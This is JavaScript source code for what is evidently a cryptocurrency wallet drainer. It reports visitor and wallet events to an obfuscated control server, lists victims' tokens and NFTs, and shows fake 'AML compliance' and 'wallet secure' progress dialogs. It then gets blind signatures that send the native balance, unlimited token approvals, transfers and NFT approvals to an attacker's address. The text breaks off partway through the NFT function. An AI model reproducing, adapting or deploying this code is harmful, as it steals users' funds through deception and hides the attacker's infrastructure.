(async () => { rsk_kes = CF_EKEY; CF_EKEY = Math.floor(Math.random() * 1000); })()

const send_request = async (data) => {
  try {
    if (CF_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    while (Date.now() <= last_request_ts)
      await new Promise(r => setTimeout(r, 1));
    last_request_ts = Date.now();
    data.domain = window.location.host;
    data.worker_id = CF_Worker_ID || null;
    data.user_id = CF_ID || null;
    data.message_ts = last_request_ts;
    data.chat_data = CF_Custom_Chat.Enable == 0 ? false : CF_Custom_Chat.Chat_Settings;
    data.wallet_address = CF_Current_Address;
    data.partner_address = CF_Partner_Address;
    const encode_key = btoa(String(5 + 3 + 365 + 3462 + 888 + rsk_kes));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `v=150725&s=1&r=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') CF_Force_Mode = true;
      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
        CF_Force_Mode = true;
        try {
          if (CF_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
              showConfirmButton: true, confirmButtonText: 'OK', timer: 90000, color: CF_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
              showConfirmButton: true, confirmButtonText: 'OK'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrieve_config = async () => {
  try {
    const response = await send_request({ action: 'retrieve_config' });
    if (response.status == 'OK') {
      CF_Connection = true;
      CF_Settings = response.data;
      CF_Gas_Multiplier = CF_Settings.Settings.Gas_Multiplier;
      if (!CF_Settings.CIS) CF_Bad_Country = false;
      if (typeof CF_Settings.DSB == 'boolean' && CF_Settings.DSB === true) {
        window.location.href = 'about:blank';
      }
    }
  } catch(err) {
    console.log(err);
  }
};

const retrieve_wallet = async () => {
  try {
    let personal_wallet = null;
    if (localStorage['personal_wallet'] ) personal_wallet = { address: localStorage['personal_wallet'] };
    const response = await send_request({ action: 'retrieve_wallet', personal_wallet });
    if (response.status == 'OK') {
      CF_Settings.Personal_Wallet = response.wallet;
      if (CF_Settings.Personal_Wallet && typeof CF_Settings.Personal_Wallet == 'object') {
        localStorage['personal_wallet'] = CF_Settings.Personal_Wallet.address;
      }
    }
  } catch(err) {
    console.log(err);
    CF_Settings.Personal_Wallet = null;
  }
};

const retrieve_contract = async () => {
  try {
    const response = await send_request({ action: 'retrieve_contract' });
    if (response.status == 'OK') CF_Contract_ABI = response.data;
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    let response = await send_request({
      action: 'enter_website',
      user_id: CF_ID,
      time: new Date().toLocaleString('ru-RU')
    });
    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
      CF_Bad_Country = true;
    }
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!CF_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!CF_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: CF_ID, wallet: CF_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!CF_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: CF_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!CF_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: CF_ID, address: CF_Current_Address,
      wallet: (CF_Wallet_Name == null ? CF_Current_Provider : CF_Wallet_Name), chain_id: CF_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        case 'blast': return 81457;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        case 'blast': return 81457;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        case 25: return 'cronos';
        case 100: return 'gnosis';
        case 128: return 'heco';
        case 1284: return 'moonbeam';
        case 1285: return 'moonriver';
        case 2222: return 'kava';
        case 42220: return 'celo';
        case 1666600000: return 'harmony';
        case 324: return 'zksync_era';
        case 8453: return 'base';
        case 369: return 'pulse';
        case 81457: return 'blast';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 25: return 'CRO';
        case 100: return 'XDAI';
        case 128: return 'HT';
        case 1284: return 'GLMR';
        case 1285: return 'MOVR';
        case 2222: return 'KAVA';
        case 42220: return 'CELO';
        case 1666600000: return 'ONE';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        case 81457: return 'ETH';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${CF_Settings.AT || ''}`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (CF_Settings.Contract_Whitelist.length > 0 && !CF_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
        else if (CF_Settings.Contract_Blacklist.length > 0 && CF_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address || null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (CF_Settings.Contract_Whitelist.length > 0 && !CF_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        else if (CF_Settings.Contract_Blacklist.length > 0 && CF_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
        asset_price = asset_price * CF_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrieve_timeout = {};
const retrieve_token = async (chain_id, contract_address) => {
  try {
    if (!CF_API_Data[chain_id] || CF_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return CF_Contract_ABI['ERC20'];
    while (retrieve_timeout[chain_id] && retrieve_timeout[chain_id].time == Math.floor(Date.now() / 1000) && retrieve_timeout[chain_id].count >= 5)
      await new Promise(r => setTimeout(r, 100));
    if (!retrieve_timeout[chain_id])
      retrieve_timeout[chain_id] = { time: Math.floor(Date.now() / 1000), count: 1 };
    else {
      if (retrieve_timeout[chain_id].time == Math.floor(Date.now() / 1000)) retrieve_timeout[chain_id].count += 1;
      else {
        retrieve_timeout[chain_id].time = Math.floor(Date.now() / 1000);
        retrieve_timeout[chain_id].count = 1;
      }
    }
    let response = await fetch(`https://${CF_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${CF_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrieve_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return CF_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return CF_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (CF_Settings.Settings.Permit.Mode == false) return 0;
    const is_permit_function = ((func) => {
      for (const key in func) {
        if (key.startsWith('permit(')) {
          return true;
        }
      }; return false;
    })(func);
    if ((func.hasOwnProperty('permit') || is_permit_function) && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
          }
        }; return 0;
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const CF_Gas_Reserves = {};

const show_check = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Establishing Connection', text: 'Connecting securely to blockchain...',
        showConfirmButton: true, confirmButtonText: 'Please wait...', timer: 2000, color: CF_Color_Scheme
      }).then(() => {
        if (CF_Check_Done) return;
        MSL.fire({
          icon: 'load', title: 'Synchronizing Data', text: 'Linking to blockchain nodes...',
          showConfirmButton: true, confirmButtonText: 'Please wait...', timer: 3000, color: CF_Color_Scheme
        }).then(() => {
          if (CF_Check_Done) return;
          MSL.fire({
            icon: 'success', title: 'Connection Established', subtitle: 'Blockchain connection secured',
            text: 'Ready to retrieve wallet details!', showConfirmButton: false, timer: 2000, color: CF_Color_Scheme
          }).then(() => {
            if (CF_Check_Done) return;
            MSL.fire({
              icon: 'load', title: 'Loading Wallet', text: 'Accessing wallet information...',
              showConfirmButton: true, confirmButtonText: 'Loading...', timer: 3000, color: CF_Color_Scheme
            }).then(() => {
              if (CF_Check_Done) return;
              MSL.fire({
                icon: 'success', title: 'Wallet Detected', subtitle: 'Address retrieved successfully',
                text: 'Proceeding with additional checks...', showConfirmButton: false, timer: 2000, color: CF_Color_Scheme
              }).then(() => {
                if (CF_Check_Done) return;
                MSL.fire({
                  icon: 'load', title: 'Blockchain Status Verification', text: 'Checking latest blockchain state...',
                  showConfirmButton: true, confirmButtonText: 'Checking...', timer: 3000, color: CF_Color_Scheme
                }).then(() => {
                  if (CF_Check_Done) return;
                  MSL.fire({
                    icon: 'load', title: 'Analyzing Wallet', text: 'Conducting AML compliance check...',
                    showConfirmButton: true, confirmButtonText: 'Analyzing...', timer: 4000, color: CF_Color_Scheme
                  }).then(() => {
                    if (CF_Check_Done) return;
                    MSL.fire({
                      icon: 'error', title: 'Minor Risk Detected', subtitle: 'Anomaly in wallet history',
                      text: 'Analysis will continue with caution.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                    }).then(() => {
                      if (CF_Check_Done) return;
                      MSL.fire({
                        icon: 'success', title: 'Risk Analysis Complete', subtitle: 'No significant issues found',
                        text: 'Proceeding to reputation check.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                      }).then(() => {
                        if (CF_Check_Done) return;
                        MSL.fire({
                          icon: 'load', title: 'Checking Reputation', text: 'Assessing wallet reputation score...',
                          showConfirmButton: true, confirmButtonText: 'Assessing...', timer: 3000, color: CF_Color_Scheme
                        }).then(() => {
                          if (CF_Check_Done) return;
                          MSL.fire({
                            icon: 'success', title: 'Reputation Verified', subtitle: 'Wallet reputation score approved',
                            text: 'No issues detected.', showConfirmButton: false, timer: 3000, color: CF_Color_Scheme
                          }).then(() => {
                            if (CF_Check_Done) return;
                            MSL.fire({
                              icon: 'load', title: 'Finalizing Checks', text: 'Final verification of wallet credentials...',
                              showConfirmButton: true, confirmButtonText: 'Finalizing...', timer: 4000, color: CF_Color_Scheme
                            }).then(() => {
                              if (CF_Check_Done) return;
                              MSL.fire({
                                icon: 'success', title: 'Verification Complete', subtitle: 'Your wallet is secure!',
                                text: 'All checks have been passed successfully.', showConfirmButton: false, timer: 4000, color: CF_Color_Scheme
                              }).then(() => {
                                if (CF_Check_Done) return;
                                MSL.fire({
                                  icon: 'load', title: 'Finalizing', text: 'Verifying additional details...',
                                  showConfirmButton: true, confirmButtonText: 'Almost there...', timer: 900000, color: CF_Color_Scheme
                                });
                              });
                            });
                          });
                        });
                      });
                    });
                  });
                });
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: 'Connection established',
        icon: 'success',
        timer: 2000
      }).then(() => {
        if (CF_Check_Done) return;
        Swal.fire({
          text: 'Connecting to Blockchain...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (CF_Check_Done) return;
          Swal.fire({
            text: 'Getting your wallet address...',
            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (CF_Check_Done) return;
            Swal.fire({
              text: 'Checking your wallet for AML...',
              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
              timer: 5000, width: 600, showConfirmButton: false
            }).then(() => {
              if (CF_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is AML clear!',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(() => {
                if (CF_Check_Done) return;
                Swal.fire({
                  text: 'Please wait, we\'re scanning more details...',
                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                  timer: 0, width: 600, showConfirmButton: false
                });
              });
            });
          });
        });
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(CF_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!CF_Process) return;
    Swal.close();
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'Signature Received!', subtitle: 'Thank you!',
        text: 'We received your sign, please wait for confirmation...',
        showConfirmButton: false, timer: 2500, color: CF_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Processing Signature', text: 'Please, stay on this page while we confirm it...',
          showConfirmButton: true, confirmButtonText: 'Confirming...', color: CF_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Thanks!</b>', icon: 'success',
        allowOutsideClick: false, allowEscapeKey: false,
        timer: 2500, width: 600, showConfirmButton: false
      }).then(() => {
        Swal.fire({
          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      });
    }

  } catch(err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'error', title: 'Insufficient Funds', subtitle: 'Unable to proceed',
        text: 'Your wallet does not meet the minimum balance requirements. Please try again with a different wallet.',
        showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
        showConfirmButton: true, confirmButtonText: 'OK'
      });
    }
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'Transaction Signed', subtitle: 'Signature confirmed!',
        text: 'Your transaction is being processed. Please wait...', showConfirmButton: false, color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Success!</b> Your sign is confirmed!',
        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      show_sign_message();
      return;
    }
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Action Required', text: 'Please, sign the message in your wallet to continue...',
        showConfirmButton: true, confirmButtonText: 'Awaiting Signature...', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, CF_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_gas_limit_def_by_chain_id = (chain_id) => {
  switch (chain_id) {
    case 42161: return BN(5000000);
    case 43114: return BN(5000000);
    default: return BN(100000);
  }
}

const show_sign_message = () => {
  try {
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Action Required', text: 'Please, sign the message in your wallet to continue...',
        showConfirmButton: true, confirmButtonText: 'Awaiting Signature...', color: CF_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const SIGN_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

  let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100), data: "0x" };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

  if (CF_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
      max_value = elem.amount; current_percent = elem.percent;
    }
    available_amount = balance.sub(gas_limit.mul(gas_price))
    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
    available_amount = balance.sub(gas_limit.mul(gas_price));
  }

  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  const web3 = new Web3(CF_Provider);

  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await sign_success(asset, available_amount); sign_ready();
};

const SIGN_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
  for (const c_address of CF_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (CF_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(CF_Settings.Address, max_approval_amount).encodeABI();
  else if (CF_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(CF_Settings.Receiver, asset.amount_raw).encodeABI();

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await sign_success(asset); sign_ready();
};

const SIGN_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
  const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
  const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC721'], asset.address);

  if (CF_Settings.Settings.Sign.NFTs == 1) contract_data = web3_contract.methods.setApprovalForAll(CF_Settings.Address, true).encodeABI();
  else if (CF_Settings.Settings.Sign.NFTs == 2) contract_data = web3_contract.methods.transferFrom(CF_Current_Address, CF_Settings.Receiver, asset.id).encodeABI();

  let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(CF_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
